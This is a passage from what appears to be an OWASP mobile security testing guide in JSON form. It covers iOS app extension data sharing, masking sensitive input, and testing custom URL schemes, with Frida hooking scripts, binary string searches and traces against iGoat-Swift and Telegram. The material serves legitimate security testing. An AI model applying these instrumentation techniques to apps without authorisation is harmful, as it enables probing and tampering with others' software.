supported. For example:</p><pre>&lt;key&gt;NSExtensionAttributes&lt;/key&gt;\n    &lt;dict&gt;\n        &lt;key&gt;NSExtensionActivationRule&lt;/key&gt;\n        &lt;dict&gt;\n            &lt;key&gt;NSExtensionActivationSupportsImageWithMaxCount&lt;/key&gt;\n            &lt;integer&gt;10&lt;/integer&gt;\n            &lt;key&gt;NSExtensionActivationSupportsMovieWithMaxCount&lt;/key&gt;\n            &lt;integer&gt;1&lt;/integer&gt;\n            &lt;key&gt;NSExtensionActivationSupportsWebURLWithMaxCount&lt;/key&gt;\n            &lt;integer&gt;1&lt;/integer&gt;\n        &lt;/dict&gt;\n    &lt;/dict&gt;\n</pre><p>Only the data types present here and not having 0 as MaxCount will be supported. However, more complex filtering is possible by using a so-called predicate string that will evaluate the UTIs given. Please refer to the <a href=\"https://developer.apple.com/library/archive/documentation/General/Conceptual/ExtensibilityPG/ExtensionScenarios.html#//apple_ref/doc/uid/TP40014214-CH21-SW8\" rel=\"noopener noreferrer\" target=\"_blank\">Apple App Extension Programming Guide ↗</a> for more detailed information about this.</p><h3>Checking Data Sharing with the Containing App</h3><p>Remember that app extensions and their containing apps do not have direct access to each other's containers. However, data sharing can be enabled. This is done via <a href=\"https://developer.apple.com/library/archive/documentation/Miscellaneous/Reference/EntitlementKeyReference/Chapters/EnablingAppSandbox.html#//apple_ref/doc/uid/TP40011195-CH4-SW19\" rel=\"noopener noreferrer\" target=\"_blank\">\"App Groups\" ↗</a> and the <a href=\"https://developer.apple.com/documentation/foundation/nsuserdefaults\" rel=\"noopener noreferrer\" target=\"_blank\">NSUserDefaults ↗</a> API. See this figure from <a href=\"https://developer.apple.com/library/archive/documentation/General/Conceptual/ExtensibilityPG/ExtensionScenarios.html#//apple_ref/doc/uid/TP40014214-CH21-SW11\" rel=\"noopener noreferrer\" target=\"_blank\">Apple App Extension Programming Guide ↗</a>:</p><p>As also mentioned in the guide, the app must set up a shared container if the app extension uses the NSURLSession class to perform a background upload or download, so that both the extension and its containing app can access the transferred data.</p><h3>Verifying if the App Restricts the Use of App Extensions</h3><p>It is possible to reject a specific type of app extension by using the following method:</p><ul><li><a href=\"https://developer.apple.com/documentation/uikit/uiapplicationdelegate/1623122-application?language=objc\" rel=\"noopener noreferrer\" target=\"_blank\">application:shouldAllowExtensionPointIdentifier: ↗</a></li></ul><p>However, it is currently only possible for \"custom keyboard\" app extensions (and should be verified when testing apps handling sensitive data via the keyboard like e.g. banking apps).</p><h2>Dynamic Analysis</h2><p>For the dynamic analysis we can do the following to gain knowledge without having the source code:</p><ul><li>Inspecting the items being shared</li><li>Identifying the app extensions involved</li></ul><h3>Inspecting the Items Being Shared</h3><p>For this we should hook NSExtensionContext - inputItems in the data originating app.</p><p>Following the previous example of Telegram we will now use the \"Share\" button on a text file (that was received from a chat) to create a note in the Notes app with it:</p><p>If we run a trace, we'd see the following output:</p><pre>(0x1c06bb420) NSExtensionContext - inputItems\n0x18284355c Foundation!-[NSExtension _itemProviderForPayload:extensionContext:]\n0x1828447a4 Foundation!-[NSExtension _loadItemForPayload:contextIdentifier:completionHandler:]\n0x182973224 Foundation!__NSXPCCONNECTION_IS_CALLING_OUT_TO_EXPORTED_OBJECT_S3__\n0x182971968 Foundation!-[NSXPCConnection _decodeAndInvokeMessageWithEvent:flags:]\n0x182748830 Foundation!message_handler\n0x181ac27d0 libxpc.dylib!_xpc_connection_call_event_handler\n0x181ac0168 libxpc.dylib!_xpc_connection_mach_event\n...\nRET: (\n\"&lt;NSExtensionItem: 0x1c420a540&gt; - userInfo:\n{\n    NSExtensionItemAttachmentsKey =     (\n    \"&lt;NSItemProvider: 0x1c46b30e0&gt; {types = (\\n \\\"public.plain-text\\\",\\n \\\"public.file-url\\\"\\n)}\"\n    );\n}\"\n)\n</pre><p>Here we can observe that:</p><ul><li>This occurred under-the-hood via XPC, concretely it is implemented via a NSXPCConnection that uses the libxpc.dylib Framework.</li><li>The UTIs included in the NSItemProvider are public.plain-text and public.file-url, the latter being included in NSExtensionActivationRule from the <a href=\"https://github.com/TelegramMessenger/Telegram-iOS/blob/master/Telegram/Share/Info.plist\" rel=\"noopener noreferrer\" target=\"_blank\">Info.plist of the \"Share Extension\" of Telegram ↗</a>.</li></ul><h3>Identifying the App Extensions Involved</h3><p>You can also find out which app extension is taking care of your the requests and responses by hooking NSExtension - _plugIn:</p><p>We run the same example again:</p><pre>(0x1c0370200) NSExtension - _plugIn\nRET: &lt;PKPlugin: 0x1163637f0 ph.telegra.Telegraph.Share(5.3) 5B6DE177-F09B-47DA-90CD-34D73121C785\n1(2) /private/var/containers/Bundle/Application/15E6A58F-1CA7-44A4-A9E0-6CA85B65FA35\n/Telegram X.app/PlugIns/Share.appex&gt;\n\n(0x1c0372300)  -[NSExtension _plugIn]\nRET: &lt;PKPlugin: 0x10bff7910 com.apple.mobilenotes.SharingExtension(1.5) 73E4F137-5184-4459-A70A-83\nF90A1414DC 1(2) /private/var/containers/Bundle/Application/5E267B56-F104-41D0-835B-F1DAB9AE076D\n/MobileNotes.app/PlugIns/com.apple.mobilenotes.SharingExtension.appex&gt;\n</pre><p>As you can see there are two app extensions involved:</p><ul><li>Share.appex is sending the text file (public.plain-text and public.file-url).</li><li>com.apple.mobilenotes.SharingExtension.appex which is receiving and will process the text file.</li></ul><p>If you want to learn more about what's happening under-the-hood in terms of XPC, we recommend to take a look at the internal calls from \"libxpc.dylib\". For example you can use <a href=\"https://www.frida.re/docs/frida-trace/\" rel=\"noopener noreferrer\" target=\"_blank\">frida-trace ↗</a> and then dig deeper into the methods that you find more interesting by extending the automatically generated stubs.</p>",
        "code": "MASTG-TEST-0072",
        "sort_order": 79
    },
    {
        "tags":
        [
            "MASTG-TEST-0057: Checking for Sensitive Data Disclosed Through the User Interface"
        ],
        "testcase": "Checking for Sensitive Data Disclosed Through the User Interface",
        "details": "<h2>Overview</h2><p></p><h2>Static Analysis</h2><p>A text field that masks its input can be configured in two ways:</p><p><strong>Storyboard</strong> In the iOS project's storyboard, navigate to the configuration options for the text field that takes sensitive data. Make sure that the option \"Secure Text Entry\" is selected. If this option is activated, dots are shown in the text field in place of the text input.</p><p><strong>Source Code</strong> If the text field is defined in the source code, make sure that the option <a href=\"https://developer.apple.com/documentation/uikit/uitextinputtraits/1624427-issecuretextentry\" rel=\"noopener noreferrer\" target=\"_blank\">isSecureTextEntry ↗</a> is set to \"true\". This option obscures the text input by showing dots.</p><pre>sensitiveTextField.isSecureTextEntry = true\n</pre><h2></h2><h2>Dynamic Analysis</h2><p>To determine whether the application leaks any sensitive information to the user interface, run the application and identify components that either show such information or take it as input.</p><p>If the information is masked by, for example, asterisks or dots, the app isn't leaking data to the user interface.</p>",
        "code": "MASTG-TEST-0057",
        "sort_order": 74
    },
    {
        "tags":
        [
            "MASTG-TEST-0075: Testing Custom URL Schemes"
        ],
        "testcase": "Testing Custom URL Schemes",
        "details": "<h2>Overview</h2><p></p><h2>Static Analysis</h2><p>There are a couple of things that we can do using static analysis. In the next sections we will see the following:</p><ul><li>Testing custom URL schemes registration</li><li>Testing application query schemes registration</li><li>Testing URL handling and validation</li><li>Testing URL requests to other apps</li><li>Testing for deprecated methods</li></ul><h3>Testing Custom URL Schemes Registration</h3><p>The first step to test custom URL schemes is finding out whether an application registers any protocol handlers.</p><p>If you have the original source code and want to view registered protocol handlers, simply open the project in Xcode, go to the <strong>Info</strong> tab and open the <strong>URL Types</strong> section as presented in the screenshot below:</p><p>Also in Xcode you can find this by searching for the CFBundleURLTypes key in the app's Info.plist file (example from <em><a href=\"https://mas.owasp.org/MASTG-APP-0028\" rel=\"noopener noreferrer\" target=\"_blank\"> iGoat-Swift</a></em>):</p><pre>&lt;key&gt;CFBundleURLTypes&lt;/key&gt;\n&lt;array&gt;\n    &lt;dict&gt;\n        &lt;key&gt;CFBundleURLName&lt;/key&gt;\n        &lt;string&gt;com.iGoat.myCompany&lt;/string&gt;\n        &lt;key&gt;CFBundleURLSchemes&lt;/key&gt;\n        &lt;array&gt;\n            &lt;string&gt;iGoat&lt;/string&gt;\n        &lt;/array&gt;\n    &lt;/dict&gt;\n&lt;/array&gt;\n</pre><p>In a compiled application (or IPA), registered protocol handlers are found in the file Info.plist in the app bundle's root folder. Open it and search for the CFBundleURLSchemes key, if present, it should contain an array of strings (example from <em><a href=\"https://mas.owasp.org/MASTG-APP-0028\" rel=\"noopener noreferrer\" target=\"_blank\"> iGoat-Swift</a></em>):</p><pre>grep -A 5 -nri urlsch Info.plist\nInfo.plist:45:    &lt;key&gt;CFBundleURLSchemes&lt;/key&gt;\nInfo.plist-46-    &lt;array&gt;\nInfo.plist-47-        &lt;string&gt;iGoat&lt;/string&gt;\nInfo.plist-48-    &lt;/array&gt;\n</pre><p>Once the URL scheme is registered, other apps can open the app that registered the scheme, and pass parameters by creating appropriately formatted URLs and opening them with the <a href=\"https://developer.apple.com/documentation/uikit/uiapplication/1648685-openurl?language=objc\" rel=\"noopener noreferrer\" target=\"_blank\">UIApplication openURL:options:completionHandler: ↗</a> method.</p><p>Note from the <a href=\"https://developer.apple.com/library/archive/documentation/iPhone/Conceptual/iPhoneOSProgrammingGuide/Inter-AppCommunication/Inter-AppCommunication.html#//apple_ref/doc/uid/TP40007072-CH6-SW7\" rel=\"noopener noreferrer\" target=\"_blank\">App Programming Guide for iOS ↗</a>:</p><p>If more than one third-party app registers to handle the same URL scheme, there is currently no process for determining which app will be given that scheme.</p><p>This could lead to a URL scheme hijacking attack (see page 136 in [#thiel2]).</p><h3>Testing Application Query Schemes Registration</h3><p>Before calling the openURL:options:completionHandler: method, apps can call <a href=\"https://developer.apple.com/documentation/uikit/uiapplication/1622952-canopenurl?language=objc\" rel=\"noopener noreferrer\" target=\"_blank\">canOpenURL: ↗</a> to verify that the target app is available. However, as this method was being used by malicious app as a way to enumerate installed apps, <a href=\"https://developer.apple.com/documentation/uikit/uiapplication/1622952-canopenurl?language=objc#discussion\" rel=\"noopener noreferrer\" target=\"_blank\">from iOS 9.0 the URL schemes passed to it must be also declared ↗</a> by adding the LSApplicationQueriesSchemes key to the app's Info.plist file and an array of up to 50 URL schemes.</p><pre>&lt;key&gt;LSApplicationQueriesSchemes&lt;/key&gt;\n    &lt;array&gt;\n        &lt;string&gt;url_scheme1&lt;/string&gt;\n        &lt;string&gt;url_scheme2&lt;/string&gt;\n    &lt;/array&gt;\n</pre><p>canOpenURL will always return NO for undeclared schemes, whether or not an appropriate app is installed. However, this restriction only applies to canOpenURL.</p><p><strong>The openURL:options:completionHandler: method will still open any URL scheme, even if the LSApplicationQueriesSchemes array was declared</strong>, and return YES / NO depending on the result.</p><p>As an example, Telegram declares in its <a href=\"https://github.com/TelegramMessenger/Telegram-iOS/blob/master/Telegram/Telegram-iOS/Info.plist#L233\" rel=\"noopener noreferrer\" target=\"_blank\">Info.plist ↗</a> these Queries Schemes, among others:</p><pre>    &lt;key&gt;LSApplicationQueriesSchemes&lt;/key&gt;\n    &lt;array&gt;\n        &lt;string&gt;dbapi-3&lt;/string&gt;\n        &lt;string&gt;instagram&lt;/string&gt;\n        &lt;string&gt;googledrive&lt;/string&gt;\n        &lt;string&gt;comgooglemaps-x-callback&lt;/string&gt;\n        &lt;string&gt;foursquare&lt;/string&gt;\n        &lt;string&gt;here-location&lt;/string&gt;\n        &lt;string&gt;yandexmaps&lt;/string&gt;\n        &lt;string&gt;yandexnavi&lt;/string&gt;\n        &lt;string&gt;comgooglemaps&lt;/string&gt;\n        &lt;string&gt;youtube&lt;/string&gt;\n        &lt;string&gt;twitter&lt;/string&gt;\n        ...\n</pre><h3>Testing URL Handling and Validation</h3><p>In order to determine how a URL path is built and validated, if you have the original source code, you can search for the following methods:</p><ul><li>application:didFinishLaunchingWithOptions: method or application:will-FinishLaunchingWithOptions:: verify how the decision is made and how the information about the URL is retrieved.</li><li><a href=\"https://developer.apple.com/documentation/uikit/uiapplicationdelegate/1623112-application?language=objc\" rel=\"noopener noreferrer\" target=\"_blank\">application:openURL:options: ↗</a>: verify how the resource is being opened, i.e. how the data is being parsed, verify the <a href=\"https://developer.apple.com/documentation/uikit/uiapplication/openurloptionskey\" rel=\"noopener noreferrer\" target=\"_blank\">options ↗</a>, especially if access by the calling app (<a href=\"https://developer.apple.com/documentation/uikit/uiapplication/openurloptionskey/1623128-sourceapplication\" rel=\"noopener noreferrer\" target=\"_blank\">sourceApplication ↗</a>) should be allowed or denied. The app might also need user permission when using the custom URL scheme.</li></ul><p>In Telegram you will <a href=\"https://github.com/peter-iakovlev/Telegram-iOS/blob/87e0a33ac438c1d702f2a0b75bf21f26866e346f/Telegram-iOS/AppDelegate.swift#L1250\" rel=\"noopener noreferrer\" target=\"_blank\">find four different methods being used ↗</a>:</p><pre>func application(_ application: UIApplication, open url: URL, sourceApplication: String?) -&gt; Bool {\n    self.openUrl(url: url)\n    return true\n}\n\nfunc application(_ application: UIApplication, open url: URL, sourceApplication: String?,\nannotation: Any) -&gt; Bool {\n    self.openUrl(url: url)\n    return true\n}\n\nfunc application(_ app: UIApplication, open url: URL,\noptions: [UIApplicationOpenURLOptionsKey : Any] = [:]) -&gt; Bool {\n    self.openUrl(url: url)\n    return true\n}\n\nfunc application(_ application: UIApplication, handleOpen url: URL) -&gt; Bool {\n    self.openUrl(url: url)\n    return true\n}\n</pre><p>We can observe some things here:</p><ul><li>The app implements also deprecated methods like <a href=\"https://developer.apple.com/documentation/uikit/uiapplicationdelegate/1622964-application?language=objc\" rel=\"noopener noreferrer\" target=\"_blank\">application:handleOpenURL: ↗</a> and <a href=\"https://developer.apple.com/documentation/uikit/uiapplicationdelegate/1623073-application\" rel=\"noopener noreferrer\" target=\"_blank\">application:openURL:sourceApplication:annotation: ↗</a>.</li><li>The source application is not being verified in any of those methods.</li><li>All of them call a private openUrl method. You can <a href=\"https://github.com/peter-iakovlev/Telegram-iOS/blob/87e0a33ac438c1d702f2a0b75bf21f26866e346f/Telegram-iOS/AppDelegate.swift#L1270\" rel=\"noopener noreferrer\" target=\"_blank\">inspect it ↗</a> to learn more about how the URL request is handled.</li></ul><h3>Testing URL Requests to Other Apps</h3><p>The method <a href=\"https://developer.apple.com/documentation/uikit/uiapplication/1648685-openurl?language=objc\" rel=\"noopener noreferrer\" target=\"_blank\">openURL:options:completionHandler: ↗</a> and the <a href=\"https://developer.apple.com/documentation/uikit/uiapplication/1622961-openurl?language=objc\" rel=\"noopener noreferrer\" target=\"_blank\">deprecated openURL: method of UIApplication ↗</a> are responsible for opening URLs (i.e. to send requests / make queries to other apps) that may be local to the current app or it may be one that must be provided by a different app. If you have the original source code you can search directly for usages of those methods.</p><p>Additionally, if you are interested into knowing if the app is querying specific services or apps, and if the app is well-known, you can also search for common URL schemes online and include them in your greps. For example, a <a href=\"https://ios.gadgethacks.com/news/always-updated-list-ios-app-url-scheme-names-0184033/\" rel=\"noopener noreferrer\" target=\"_blank\">quick Google search reveals ↗</a>:</p><pre>Apple Music - music:// or musics:// or audio-player-event://\nCalendar - calshow:// or x-apple-calevent://\nContacts - contacts://\nDiagnostics - diagnostics:// or diags://\nGarageBand - garageband://\niBooks - ibooks:// or itms-books:// or itms-bookss://\nMail - message:// or mailto://emailaddress\nMessages - sms://phonenumber\nNotes - mobilenotes://\n...\n</pre><p>We search for this method in the Telegram source code, this time without using Xcode, just with egrep:</p><pre>$ egrep -nr \"open.*options.*completionHandler\" ./Telegram-iOS/\n\n./AppDelegate.swift:552: return UIApplication.shared.open(parsedUrl,\n    options: [UIApplicationOpenURLOptionUniversalLinksOnly: true as NSNumber],\n    completionHandler: { value in\n./AppDelegate.swift:556: return UIApplication.shared.open(parsedUrl,\n    options: [UIApplicationOpenURLOptionUniversalLinksOnly: true as NSNumber],\n    completionHandler: { value in\n</pre><p>If we inspect the results we will see that openURL:options:completionHandler: is actually being used for universal links, so we have to keep searching. For example, we can search for openURL(:</p><pre>$ egrep -nr \"openURL\\(\" ./Telegram-iOS/\n\n./ApplicationContext.swift:763:  UIApplication.shared.openURL(parsedUrl)\n./ApplicationContext.swift:792:  UIApplication.shared.openURL(URL(\n                                        string: \"https://telegram.org/deactivate?phone=\\(phone)\")!\n                                 )\n./AppDelegate.swift:423:         UIApplication.shared.openURL(url)\n./AppDelegate.swift:538:         UIApplication.shared.openURL(parsedUrl)\n...\n</pre><p>If we inspect those lines we will see how this method is also being used to open \"Settings\" or to open the \"App Store Page\".</p><p>When just searching for :// we see:</p><pre>if documentUri.hasPrefix(\"file://\"), let path = URL(string: documentUri)?.path {\nif !url.hasPrefix(\"mt-encrypted-file://?\") {\nguard let dict = TGStringUtils.argumentDictionary(inUrlString: String(url[url.index(url.startIndex,\n    offsetBy: \"mt-encrypted-file://?\".count)...])) else {\nparsedUrl = URL(string: \"https://\\(url)\")\nif let url = URL(string: \"itms-apps://itunes.apple.com/app/id\\(appStoreId)\") {\n} else if let url = url as? String, url.lowercased().hasPrefix(\"tg://\") {\n[[WKExtension sharedExtension] openSystemURL:[NSURL URLWithString:[NSString\n    stringWithFormat:@\"tel://%@\", userHandle.data]]];\n</pre><p>After combining the results of both searches and carefully inspecting the source code we find the following piece of code:</p><pre>openUrl: { url in\n            var parsedUrl = URL(string: url)\n            if let parsed = parsedUrl {\n                if parsed.scheme == nil || parsed.scheme!.isEmpty {\n                    parsedUrl = URL(string: \"https://\\(url)\")\n                }\n                if parsed.scheme == \"tg\" {\n                    return\n                }\n            }\n\n            if let parsedUrl = parsedUrl {\n                UIApplication.shared.openURL(parsedUrl)\n</pre><p>Before opening a URL, the scheme is validated, \"https\" will be added if necessary and it won't open any URL with the \"tg\" scheme. When ready it will use the deprecated openURL method.</p><p>If only having the compiled application (IPA) you can still try to identify which URL schemes are being used to query other apps:</p><ul><li>Check if LSApplicationQueriesSchemes was declared or search for common URL schemes.</li><li>Also use the string :// or build a regular expression to match URLs as the app might not be declaring some schemes.</li></ul><p>You can do that by first verifying that the app binary contains those strings by e.g. using unix strings command:</p><pre>strings &lt;yourapp&gt; | grep \"someURLscheme://\"\n</pre><p>or even better, use radare2's iz/izz command or rafind2, both will find strings where the unix strings command won't. Example from <em><a href=\"https://mas.owasp.org/MASTG-APP-0028\" rel=\"noopener noreferrer\" target=\"_blank\"> iGoat-Swift</a></em>:</p><pre>$ r2 -qc izz~iGoat:// iGoat-Swift\n37436 0x001ee610 0x001ee610  23  24 (4.__TEXT.__cstring) ascii iGoat://?contactNumber=\n</pre><h3>Testing for Deprecated Methods</h3><p>Search for deprecated methods like:</p><ul><li><a href=\"https://developer.apple.com/documentation/uikit/uiapplicationdelegate/1622964-application?language=objc\" rel=\"noopener noreferrer\" target=\"_blank\">application:handleOpenURL: ↗</a></li><li><a href=\"https://developer.apple.com/documentation/uikit/uiapplication/1622961-openurl?language=objc\" rel=\"noopener noreferrer\" target=\"_blank\">openURL: ↗</a></li><li><a href=\"https://developer.apple.com/documentation/uikit/uiapplicationdelegate/1623073-application\" rel=\"noopener noreferrer\" target=\"_blank\">application:openURL:sourceApplication:annotation: ↗</a></li></ul><p>For example, using <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0129\" rel=\"noopener noreferrer\" target=\"_blank\"> rabin2</a></em> we find those three:</p><pre>$ rabin2 -zzq Telegram\\ X.app/Telegram\\ X | grep -i \"openurl\"\n\n0x1000d9e90 31 30 UIApplicationOpenURLOptionsKey\n0x1000dee3f 50 49 application:openURL:sourceApplication:annotation:\n0x1000dee71 29 28 application:openURL:options:\n0x1000dee8e 27 26 application:handleOpenURL:\n0x1000df2c9 9 8 openURL:\n0x1000df766 12 11 canOpenURL:\n0x1000df772 35 34 openURL:options:completionHandler:\n...\n</pre><h2></h2><h2>Dynamic Analysis</h2><p>Once you've identified the custom URL schemes the app has registered, there are several methods that you can use to test them:</p><ul><li>Performing URL requests</li><li>Identifying and hooking the URL handler method</li><li>Testing URL schemes source validation</li><li>Fuzzing URL schemes</li></ul><h3>Performing URL Requests</h3><p>Using Safari</p><p>To quickly test one URL scheme you can open the URLs on Safari and observe how the app behaves. For example, if you write tel://123456789 in the address bar of Safari, a pop up will appear with the <em>telephone number</em> and the options \"Cancel\" and \"Call\". If you press \"Call\" it will open the Phone app and directly make the call.</p><p>You may also know already about pages that trigger custom URL schemes, you can just navigate normally to those pages and Safari will automatically ask when it finds a custom URL scheme.</p><p>Using the Notes App</p><p>As already seen in \"Triggering Universal Links\", you may use the Notes app and long press the links you've written in order to test custom URL schemes. Remember to exit the editing mode in order to be able to open them. Note that you can click or long press links including custom URL schemes only if the app is installed, if not they won't be highlighted as <em>clickable links</em>.</p><p>Using Frida</p><p>If you simply want an app to open the URL scheme you can do it using Frida. Example using <em><a href=\"https://mas.owasp.org/MASTG-APP-0028\" rel=\"noopener noreferrer\" target=\"_blank\"> iGoat-Swift</a></em>:</p><pre>$ frida -U iGoat-Swift\n\n[iPhone::iGoat-Swift]-&gt; function openURL(url) {\n                            var UIApplication = ObjC.classes.UIApplication.sharedApplication();\n                            var toOpen = ObjC.classes.NSURL.URLWithString_(url);\n                            return UIApplication.openURL_(toOpen);\n                        }\n[iPhone::iGoat-Swift]-&gt; openURL(\"tel://234234234\")\ntrue\n</pre><p>In this example from <a href=\"https://codeshare.frida.re/@dki/ios-url-scheme-fuzzing/\" rel=\"noopener noreferrer\" target=\"_blank\">Frida CodeShare ↗</a> the author uses the non-public API LSApplication Workspace.openSensitiveURL:withOptions: to open the URLs (from the SpringBoard app):</p><pre>function openURL(url) {\n    var w = ObjC.classes.LSApplicationWorkspace.defaultWorkspace();\n    var toOpen = ObjC.classes.NSURL.URLWithString_(url);\n    return w.openSensitiveURL_withOptions_(toOpen, null);\n}\n</pre><p>Note that the use of non-public APIs is not permitted on the App Store, that's why we don't even test these but we are allowed to use them for our dynamic analysis.</p><h3>Identifying and Hooking the URL Handler Method</h3><p>If you can't look into the original source code you will have to find out yourself which method does the app use to handle the URL scheme requests that it receives. You cannot know if it is an Objective-C method or a Swift one, or even if the app is using a deprecated one.</p><p>Crafting the Link Yourself and Letting Safari Open It</p><p>For this we will use the <a href=\"https://codeshare.frida.re/@mrmacete/objc-method-observer/\" rel=\"noopener noreferrer\" target=\"_blank\">ObjC method observer ↗</a> from Frida CodeShare, which is an extremely handy script that allows you to quickly observe any collection of methods or classes just by providing a simple pattern.</p><p>In this case we are interested into all methods from the <em><a href=\"https://mas.owasp.org/MASTG-APP-0028\" rel=\"noopener noreferrer\" target=\"_blank\"> iGoat-Swift</a></em> app containing \"openURL\", therefore our pattern will be *[* *openURL*]:</p><ul><li>The first asterisk will match all instance - and class + methods.</li><li>The second matches all Objective-C classes.</li><li>The third and forth allow to match any method containing the string openURL.</li></ul><pre>$ frida -U iGoat-Swift --codeshare mrmacete/objc-method-observer\n\n[iPhone::iGoat-Swift]-&gt; observeSomething(\"*[* *openURL*]\");\nObserving  -[_UIDICActivityItemProvider activityViewController:openURLAnnotationForActivityType:]\nObserving  -[CNQuickActionsManager _openURL:]\nObserving  -[SUClientController openURL:]\nObserving  -[SUClientController openURL:inClientWithIdentifier:]\nObserving  -[FBSSystemService openURL:application:options:clientPort:withResult:]\nObserving  -[iGoat_Swift.AppDelegate application:openURL:options:]\nObserving  -[PrefsUILinkLabel openURL:]\nObserving  -[UIApplication openURL:]\nObserving  -[UIApplication _openURL:]\nObserving  -[UIApplication openURL:options:completionHandler:]\nObserving  -[UIApplication openURL:withCompletionHandler:]\nObserving  -[UIApplication _openURL:originatingView:completionHandler:]\nObserving  -[SUApplication application:openURL:sourceApplication:annotation:]\n...\n</pre><p>The list is very long and includes the methods we have already mentioned. If we trigger now one URL scheme, for example \"igoat://\" from Safari and accept to open it in the app we will see the following:</p><pre>[iPhone::iGoat-Swift]-&gt; (0x1c4038280)  -[iGoat_Swift.AppDelegate application:openURL:options:]\napplication: &lt;UIApplication: 0x101d0fad0&gt;\nopenURL: igoat://\noptions: {\n    UIApplicationOpenURLOptionsOpenInPlaceKey = 0;\n    UIApplicationOpenURLOptionsSourceApplicationKey = \"com.apple.mobilesafari\";\n}\n0x18b5030d8 UIKit!__58-[UIApplication _applicationOpenURLAction:payload:origin:]_block_invoke\n0x18b502a94 UIKit!-[UIApplication _applicationOpenURLAction:payload:origin:]\n...\n0x1817e1048 libdispatch.dylib!_dispatch_client_callout\n0x1817e86c8 libdispatch.dylib!_dispatch_block_invoke_direct$VARIANT$mp\n0x18453d9f4 FrontBoardServices!__FBSSERIALQUEUE_IS_CALLING_OUT_TO_A_BLOCK__\n0x18453d698 FrontBoardServices!-[FBSSerialQueue _performNext]\nRET: 0x1\n</pre><p>Now we know that:</p><ul><li>The method -[iGoat_Swift.AppDelegate application:openURL:options:] gets called. As we have seen before, it is the recommended way and it is not deprecated.</li><li>It receives our URL as a parameter: igoat://.</li><li>We also can verify the source application: com.apple.mobilesafari.</li><li>We can also know from where it was called, as expected from -[UIApplication _applicationOpenURLAction:payload:origin:].</li><li>The method returns 0x1 which means YES (<a href=\"https://developer.apple.com/documentation/uikit/uiapplicationdelegate/1623112-application?language=objc#return-value\" rel=\"noopener noreferrer\" target=\"_blank\">the delegate successfully handled the request ↗</a>).</li></ul><p>The call was successful and we see now that the <em><a href=\"https://mas.owasp.org/MASTG-APP-0028\" rel=\"noopener noreferrer\" target=\"_blank\"> iGoat-Swift</a></em> app was open:</p><p>Notice that we can also see that the caller (source application) was Safari if we look in the upper-left corner of the screenshot.</p><p>Dynamically Opening the Link from the App Itself</p><p>It is also interesting to see which other methods get called on the way. To change the result a little bit we will call the same URL scheme from the <em><a href=\"https://mas.owasp.org/MASTG-APP-0028\" rel=\"noopener noreferrer\" target=\"_blank\"> iGoat-Swift</a></em> app itself. We will use again ObjC method observer and the Frida REPL:</p><pre>$ frida -U iGoat-Swift --codeshare mrmacete/objc-method-observer\n\n[iPhone::iGoat-Swift]-&gt; function openURL(url) {\n                            var UIApplication = ObjC.classes.UIApplication.sharedApplication();\n                            var toOpen = ObjC.classes.NSURL.URLWithString_(url);\n                            return UIApplication.openURL_(toOpen);\n                        }\n\n[iPhone::iGoat-Swift]-&gt; observeSomething(\"*[* *openURL*]\");\n[iPhone::iGoat-Swift]-&gt; openURL(\"iGoat://?contactNumber=123456789&amp;message=hola\")\n\n(0x1c409e460)  -[__NSXPCInterfaceProxy__LSDOpenProtocol openURL:options:completionHandler:]\nopenURL: iGoat://?contactNumber=123456789&amp;message=hola\noptions: nil\ncompletionHandler: &lt;__NSStackBlock__: 0x16fc89c38&gt;\n0x183befbec MobileCoreServices!-[LSApplicationWorkspace openURL:withOptions:error:]\n0x10ba6400c\n...\nRET: nil\n\n...\n\n(0x101d0fad0)  -[UIApplication openURL:]\nopenURL: iGoat://?contactNumber=123456789&amp;message=hola\n0x10a610044\n...\nRET: 0x1\n\ntrue\n(0x1c4038280)  -[iGoat_Swift.AppDelegate application:openURL:options:]\napplication: &lt;UIApplication: 0x101d0fad0&gt;\nopenURL: iGoat://?contactNumber=123456789&amp;message=hola\noptions: {\n    UIApplicationOpenURLOptionsOpenInPlaceKey = 0;\n    UIApplicationOpenURLOptionsSourceApplicationKey = \"OWASP.iGoat-Swift\";\n}\n0x18b5030d8 UIKit!__58-[UIApplication _applicationOpenURLAction:payload:origin:]_block_invoke\n0x18b502a94 UIKit!-[UIApplication _applicationOpenURLAction:payload:origin:]\n...\nRET: 0x1\n</pre><p>The output is truncated for better readability. This time you see that UIApplicationOpenURLOptionsSourceApplicationKey has changed to OWASP.iGoat-Swift, which makes sense. In addition, a long list of openURL-like methods were called. Considering this information can be very useful for some scenarios as it will help you to decide what you next steps will be, e.g. which method you will hook or tamper with next.</p><p>Opening a Link by Navigating to a Page and Letting Safari Open It</p><p>You can now test the same situation when clicking on a link contained on a page. Safari will identify and process the URL scheme and choose which action to execute. Opening this link \"<a href=\"https://telegram.me/fridadotre\" rel=\"noopener noreferrer\" target=\"_blank\">https://telegram.me/fridadotre ↗</a>\" will trigger this behavior.</p><p>First of all we let frida-trace generate the stubs for us:</p><pre>$ frida-trace -U Telegram -m \"*[* *restorationHandler*]\" -i \"*open*Url*\"\n    -m \"*[* *application*URL*]\" -m \"*[* openURL]\"\n...\n7310 ms  -[UIApplication _applicationOpenURLAction: 0x1c44ff900 payload: 0x10c5ee4c0 origin: 0x0]\n7311 ms     | -[AppDelegate application: 0x105a59980 openURL: 0x1c46ebb80 options: 0x1c0e222c0]\n7312 ms     | $S10TelegramUI15openExternalUrl7account7context3url05forceD016presentationData\n            18applicationContext20navigationController12dismissInputy0A4Core7AccountC_AA14Open\n            URLContextOSSSbAA012PresentationK0CAA0a11ApplicationM0C7Display010NavigationO0CSgyyctF()\n</pre><p>Now we can simply modify by hand the stubs we are interested in:</p><ul><li>The Objective-C method application:openURL:options::</li></ul><pre>// __handlers__/__AppDelegate_application_openUR_3679fadc.js\n\nonEnter: function (log, args, state) {\n    log(\"-[AppDelegate application: \" + args[2] +\n                \" openURL: \" + args[3] + \" options: \" + args[4] + \"]\");\n    log(\"\\tapplication :\" + ObjC.Object(args[2]).toString());\n    log(\"\\topenURL :\" + ObjC.Object(args[3]).toString());\n    log(\"\\toptions :\" + ObjC.Object(args[4]).toString());\n},\n</pre><ul><li>The Swift method $S10TelegramUI15openExternalUrl...:</li></ul><pre>// __handlers__/TelegramUI/_S10TelegramUI15openExternalUrl7_b1a3234e.js\n\nonEnter: function (log, args, state) {\n\n    log(\"TelegramUI.openExternalUrl(account, url, presentationData,\" +\n                \"applicationContext, navigationController, dismissInput)\");\n    log(\"\\taccount: \" + ObjC.Object(args[1]).toString());\n    log(\"\\turl: \" + ObjC.Object(args[2]).toString());\n    log(\"\\tpresentationData: \" + args[3]);\n    log(\"\\tapplicationContext: \" + ObjC.Object(args[4]).toString());\n    